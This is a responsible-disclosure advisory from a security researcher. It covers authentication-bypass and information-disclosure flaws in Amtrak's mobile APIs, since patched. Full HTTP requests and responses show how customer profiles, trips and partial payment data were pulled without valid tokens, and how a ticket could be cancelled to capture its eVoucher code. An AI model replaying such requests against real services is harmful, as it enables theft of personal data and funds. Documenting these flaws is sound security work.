---
layout: post
title: Security Blog Post  
subtitle: Amtrak Mobile APIs - Multiple Vulnerabilities
cover-img: /assets/img/path1.jpg
tags: [blog]
comments: true
share-title: Amtrak Mobile APIs - Multiple Vulnerabilities
share-description: Amtrak Mobile APIs - Multiple Vulnerabilities
readtime: true
---

## Summary 
The Amtrak mobile APIs are affected by vulnerabilities that can directly lead to the exposure of Personally Identifiable Information (PII) and partial payment data for at least 6 million Amtrak guest rewards members. The Amtrak customers’ exposed PII includes full names, addresses and phone numbers.

If an Amtrak passenger had any upcoming trips, all the trip information along with partial payment data — last four digits of the credit card, the expiration date, and billing address—could have also been exposed. Users' date of birth and citizenship information would be vulnerable if a passenger had entered this information in their reservation as well.

Additionally, an attacker could cancel a victim’s ticket and “steal” the funds by harvesting the eVoucher code. Harvesting this information could also act as a stepping stone toward “stealing” a victim’s ticket using the PNR number, as described in the next finding, sensitive information disclosure.

## Vulnerabilities

It was identified that the following two API endpoints failed to enforce authentication, which led to the exposure of customer data. Since only a valid username was required for exploitation, this attack could be carried out by any unsophisticated attackers.

* https://rider.amtrak.com/MobileApps/MyProfile
* https://rider.amtrak.com/MobileApps/MyTrips2

The Amtrak mobile application implemented SSL pinning. However, this additional form of protection was easily bypassed by dynamic instrumentation of known system-level methods that effectively disabled this check. The HTTP traffic was thus successfully intercepted.

### Authentication Bypass – User Profile

The following request was made as an unauthenticated user (since the `Authentication-Token`  header value was invalid) for obtaining a customer’s profile information:


**Request**

~~~
POST /MobileApps/MyProfile HTTP/1.1
Host: rider.amtrak.com
appType: IOS
Accept: */*
Content-Type: application/json; charset=UTF-8
Content-Length: 67
Authentication-Token: 8003D21900A9E7C8
User-Agent: Amtrak/3.1.7 (iPhone; iOS 11.1.2; Scale/2.00)
…omitted for brevity…

{
"appType": "IOS",
"userId": "hdjs@jdjdk.com",
"versionNumber": "3.1.7"
}
~~~

**Response**

~~~
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 3646

…omitted for brevity…

{
…omitted for brevity…
"responseCode": "SUCCESS",
"user": {
"amtrakGuestRewards": "8657987940",
"amtrakPromotions": "0",
"billingAddress": {
"address1": "14 Main St",
"address2": null,
"addressType": null,
"city": "New York",
"country": {
"code": "US",
"name": null
},
"firstName": "Hdbxn",
"lastName": "Banan",
"state": {
"code": "NY",
"name": null
},
"zipCode": "07888"
},
…omitted for brevity…
"phoneNumbers": [
{
"extension": null,
"number": "5454545454",
"pushNotificationPhoneNumber": null,
"type": {
"code": "B",
"isInternational": null,
"name": null
}
},
…omitted for brevity…

"title": null,
"tqpYear": "2019",
"userId": "hdjs@jdjdk.com",
"userName": "HdbxnBanan"
}

~~~

### Authentication Bypass – User Trips

The following endpoint disclosed a customer’s trip information (the `Authentication-Token` header value was invalid):

*Note: The response differs slightly because this ticket was cancelled.*

**Request**

~~~

POST /MobileApps/MyTrips2 HTTP/1.1
Host: rider.amtrak.com
appType: IOS
Accept: */*
Content-Type: application/json; charset=UTF-8
Content-Length: 69
Authentication-Token: 8003D21900A9E7C8DDC1

…omitted for brevity…
{
"versionNumber": "3.1.7",
"appType": "IOS",
"userName": "hdjs@jdjdk.com"
}


~~~


**Response**

~~~
HTTP/1.1 200 OK
Content-Type: application/json
X-DP-SRVersion: 1.0
Content-Length: 3414

…omitted for brevity…
{
"appVersion": "1.62",
"authenticationToken": null,
"buildNumber": "1.63_20180915.0300",
"hostName": "ussbpri041amtra",
"infoNotification": null,
"responseCode": "SUCCESS",
"segments": [
],
"trips": [
{
"cancelled": false,
"journeys": [
…omitted for brevity…

"arrivalDateTime": "2019-02-13T10:50:00",
"departureDateTime": "2019-02-13T10:21:00",
"departureDateTimeInUTC": null,
"departureStationCode": null,
"departureStationName": null,
"destinationStationCode": "NYP",
…omitted for brevity…
"originStationCode": "YNY",
"rooms": null,
"routeName": "Empire Service",
"seatAssignments": null,
"seats": null,
"segmentNumber": null,
"segmentServiceStatus": "false",
"trainNumber": "236",
…omitted for brevity…
"multiRideInfo": null,
"pnrNumber": "24281A",
"pnrType": 0,
"totalFare": {
…omitted for brevity…
"rateQualifier": [
],
"totalFare": 17.0
},
"type": "OneWay"
}
],
"userId": "hdjs@jdjdk.com"
}

~~~

Using the PNR information from the above response, the following request resulted in exposure of the customer’s partial payment information:

**Request**

~~~
POST /MobileApps/RetrieveReservationV4 HTTP/1.1
Host: rider.amtrak.com
appType: IOS
Accept: */*
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE

{
"email": "hdjs@jdjdk.com",
"versionNumber": "3.1.7",
"appType": "IOS",
"pnrNumber": "24281A"
}

~~~

**Response**

~~~

HTTP/1.1 200 OK
Content-Type: application/json

…omitted for brevity…
{
"PNRNumber": "24281A",
…omitted for brevity…
"payments": [
{
"address": {
"address1": "[REDACTED]",
"address2": null,
"addressType": null,
"city": "[REDACTED]",
"country": null,
"firstName": null,
"lastName": null,
"state": {
"code": "NY",
"name": null
},
"zipCode": "[REDACTED]"
},
"amount": 17.0,
"cavv": null,
"comment": null,
"eciFlag": null,
"expirationDate": "[REDACTED]",
"name": "Priyank [REDACTED]",
"number": "xxxxxxxxxxxx[REDACTED]",
"securityCode": null,
"sortOrder": 18,
"subtitle": "Priyank [REDACTED]",
"title": "Mastercard ****[REDACTED]",
"type": {
"code": "IK",
"name": "Mastercard",
…omitted for brevity…
}
}
],
…omitted for brevity…
"totalFare": 17.0

~~~


### Sensitive Information Disclosure

The ticket cancellation API offered two types of refund methods: an eVoucher or a refund to the original form of payment. The eVoucher was emailed to the email address on file for a user’s account. However, the API also returned the voucher information in the API response.

Thus, an attacker could chain the previous authentication bypass vulnerability with this information disclosure vulnerability to effectively “steal” funds from the victim. Successful exploitation of the Authentication Bypass vulnerability gave access to the customer’s PNR details. Using these details, a request to refund to an eVoucher was made, and since the response contained the eVoucher code, an attacker could legitimately use those funds on `Amtrak.com`. Although the web application attempted to verify ownership of the eVoucher by requiring the user to enter some related information, this attack could not be thwarted because the attacker would already have that information.

The following request shows the cancellation request that required the pnrNumber and amount details, all of which was available from the previous responses. An attacker could cancel a victim’s ticket and harvest the eVoucher code.

**Request**

~~~
POST /MobileApps/CancelCancelReservation HTTP/1.1
Host: rider.amtrak.com
appType: IOS

…omitted for brevity…
{
"pnrNumber": "24281A",
"versionNumber": "3.1.7",
"appType": "IOS",
"paymentSummary": {
"refund": {
"refundAmount": "17.00",
"refundWithoutFee": "17.00"
},
"availableTicketAmount": "17.00",
"unliftedTicketAmount": "17.00",
"excessTicketAmount": "17.00",
"evoucher": {
"totaleVoucher": "17.00",
"allToeVoucher": true
}
}
}
~~~

**Response**

~~~
HTTP/1.1 200 OK
Content-Type: application/json

…omitted for brevity…
{
"EVoucher": [
{
"amount": "17.00",
"expirationDate": "2020-01-10",
"issueDate": "2019-01-11",
"issuedToName": "[REDACTED]",
"refundAmount": null,
"refundExpirationDate": "2020-01-10",
"ticketNumberType": "[REDACTED]"
}
],
"PNRNumber": "24281A",

…omitted for brevity…
~~~

As highlighted above, the response contained the eVoucher code, which could now be successfully used to buy a new ticket by any person. The below screenshot shows an attacker applying an eVoucher via a guest account:


![Advisory-Amtrak-1](https://raw.githubusercontent.com/priyankn/priyankn.github.io/master/assets/img/Advisory-Amtrak-1.png)


## Solution

This issue has been resolved server-side. 

## Timeline
* 01/12/2019: Initial discovery
* 01/14/2019: Contact with vendor
* 01/15/2019: Vendor acknowledged vulnerabilities
* 02/13/2019: Vendor patched their application server
* 02/19/2019: Vulnerabilities publicly disclosed

## Researcher
Priyank Nigam, Security Researcher (Bishop Fox)



